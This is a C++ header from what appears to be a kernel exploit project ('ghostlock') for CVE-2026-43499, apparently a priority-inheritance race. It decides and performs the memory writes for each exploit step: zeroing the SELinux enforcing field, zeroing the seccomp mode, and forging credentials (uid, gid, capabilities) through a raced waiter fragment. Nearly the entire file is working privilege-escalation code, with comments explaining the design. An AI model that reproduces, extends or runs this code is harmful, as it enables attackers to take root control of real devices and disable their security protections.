#pragma once
/** @file backend/cve_2026_43499/steps/action.hpp
 *  Which write each step asks for. The decision, separated from the doing.
 *
 *  The runner walks a step set and calls the action with a StepId; what the action owes is only
 *  whether the step worked. This file holds the part of that answer that is a decision rather than
 *  an act: given a step, which WriteRequest does it mean. Keeping it pure is what makes the answer
 *  checkable without a device, a race or a session.
 *
 *  The three steps read the same way, which is why they are one table rather than three functions.
 *  Clearing the SELinux enforcing field, clearing the seccomp mode field and writing a credential
 *  fragment are not three mechanisms: two are the same "clear a field" and the third writes values.
 *  WriteMode names exactly that, and the retired tree's steps.cpp recorded the seccomp result as a
 *  flag for the same reason.
 *
 *  Addresses are passed in and never looked up here. Where a field lives comes from the profile,
 *  which is matched against the running kernel; a component that reached for it would be the second
 *  reader of a fact the session already holds, and the project reads a fact once.
 */
#include <cstdint>

#include "backend/cve_2026_43499/memory/write_encoder.hpp"
#include "backend/cve_2026_43499/memory/write_request.hpp"
#include "backend/cve_2026_43499/race/pi_race.hpp"
#include "contract/resource_scope.hpp"
#include "contract/step_catalog.hpp"

namespace ghostlock::backend::cve_2026_43499::steps {
    /** Where the three fields are, for the kernel this run matched. All three from the profile. */
    struct StepTargets final {
        /** The SELinux enforcing field. Cleared, not replaced. */
        std::uintptr_t selinux_enforcing = 0U;
        /** The credential fragment to overwrite: uid, gid and the capability set. */
        std::uintptr_t credential = 0U;
        /** The seccomp mode field. Cleared, not replaced. */
        std::uintptr_t seccomp_mode = 0U;
    };

    /**
     *  The write a step asks for.
     *
     *  @param id      The step. PageCacheWrite is answered with a refused request, because it
     *                 belongs to the other backend's set: a step this backend does not run must be
     *                 refused by name rather than quietly turned into nothing.
     *  @param targets Where the fields are this run.
     *  @return        A request. A step with no target known yet yields Disabled, which
     *                 memory::check_request refuses as NoMode -- the refusal is named, not silent.
     *  @note          Pure: the same step and the same targets always give the same request, so a
     *                 caller can predict it and a test can pin it.
     */
    [[nodiscard]] constexpr memory::WriteRequest request_for(contract::StepId id,
                                                             const StepTargets &targets) noexcept {
        memory::WriteRequest request{};
        if (id == contract::StepId::DisenforceSelinux) {
            request.target = targets.selinux_enforcing;
            request.mode = memory::WriteMode::Zero;
        } else if (id == contract::StepId::SeccompBypass) {
            request.target = targets.seccomp_mode;
            request.mode = memory::WriteMode::Zero;
        } else if (id == contract::StepId::CredentialForgery) {
            request.target = targets.credential;
            request.mode = memory::WriteMode::Credential;
        }
        /* Everything else -- the page cache write, the unknown value -- keeps Disabled. That is a
         *  request the memory layer refuses with a name, so the runner reports a failed step at that
         *  id instead of a step that did nothing and claimed success. */
        return request;
    }
}  // namespace ghostlock::backend::cve_2026_43499::steps
namespace ghostlock::backend::cve_2026_43499::steps {
    /**
     *  One step, run: the decision above, encoded, then raced.
     *
     *  The chain is short because every link already existed: request_for decides what to write,
     *  arm_for turns that into the words the waiter holds, encode_waiter_arm lays them into the
     *  fragment, and PiRace performs the attempt inside a window. What this adds is only the
     *  joining, and the rule that a failure at any link is reported with that link's own name --
     *  the memory verdicts and the race outcomes are already named, so nothing here invents a
     *  vocabulary.
     *
     *  A step that cannot be attempted is a failed step, not a step that did nothing: run() returns
     *  false and sets last_stage, so the runner stops at this id and names it.
     */
    class RaceAction final {
      public:
        /** Which link answered, as its own name. Unknown only before the first run. */
        enum class Stage : unsigned char {
            NotRun = 0,
            Request,
            Encode,
            Race,
        };

        /**
         *  @param race          The attempt, prepared per step and reused.
         *  @param window        The window the attempt must run inside; opened by the caller.
         *  @param offsets       Where the three fields sit in the fragment, from the profile.
         *  @param targets       Where the kernel fields are this run, from the session.
         *  @param fragment      Scratch the arm is laid into; must live as long as this object.
         *  @param fragment_size Its size, which decides whether an arm fits.
         *  @param pointer_bytes The target's pointer width.
         *  @param value         The value a value write aims at.
         *  @note  The window is entered by the caller before the steps run, because entering it is the
         *         caller's act: attack_window owns the exit paths and reclaims on every one of them.
         */
        RaceAction(race::PiRace<> &race, race::WindowGuard &window,
                   const memory::WaiterFieldOffsets &offsets,
                   const StepTargets &targets, std::uint8_t *fragment, std::size_t fragment_size,
                   std::size_t pointer_bytes, std::uint64_t value) noexcept
            : race_(race), window_(window), offsets_(offsets), targets_(targets), fragment_(fragment),
              fragment_size_(fragment_size), pointer_bytes_(pointer_bytes), value_(value) {}

        [[nodiscard]] Stage last_stage() const noexcept { return stage_; }
        [[nodiscard]] memory::RequestVerdict last_request() const noexcept { return request_verdict_; }
        [[nodiscard]] memory::EncodeVerdict last_encode() const noexcept { return encode_verdict_; }
        [[nodiscard]] race::RaceOutcome last_race() const noexcept { return race_outcome_; }

        /** Run one step. False stops the chain, and the stage says which link said so. */
        [[nodiscard]] bool run(contract::StepId id) noexcept {
            stage_ = Stage::Request;
            const memory::WriteRequest request = request_for(id, targets_);
            request_verdict_ = memory::check_request(request);
            if (request_verdict_ != memory::RequestVerdict::Ok || fragment_ == nullptr) {
                return false;
            }
            stage_ = Stage::Encode;
            const memory::WriteArm arm = memory::arm_for(request, value_, pointer_bytes_);
            encode_verdict_ = memory::encode_waiter_arm(fragment_, fragment_size_, offsets_, arm,
                                                        pointer_bytes_);
            if (encode_verdict_ != memory::EncodeVerdict::Ok) {
                return false;
            }
            stage_ = Stage::Race;
            race_.prepare(reinterpret_cast<std::uint32_t *>(request.target),
                          reinterpret_cast<std::uint32_t *>(request.target));
            race_outcome_ = race_.run(window_);
            return race_outcome_ == race::RaceOutcome::Disarmed ||
                   race_outcome_ == race::RaceOutcome::Destroyed;
        }

      private:
        race::PiRace<> &race_;
        race::WindowGuard &window_;
        memory::WaiterFieldOffsets offsets_{};
        StepTargets targets_{};
        std::uint8_t *fragment_ = nullptr;
        std::size_t fragment_size_ = 0U;
        std::size_t pointer_bytes_ = 0U;
        std::uint64_t value_ = 0U;
        Stage stage_ = Stage::NotRun;
        memory::RequestVerdict request_verdict_ = memory::RequestVerdict::Ok;
        memory::EncodeVerdict encode_verdict_ = memory::EncodeVerdict::Ok;
        race::RaceOutcome race_outcome_ = race::RaceOutcome::NotPrepared;
        /* The three links above are qualified with their namespace, which is also how the rest of
         *  this file names them: race:: for the window and the attempt, memory:: for the request and
         *  the arm. A step action sits in steps:: and reaches out to both. */
    };
}  // namespace ghostlock::backend::cve_2026_43499::steps
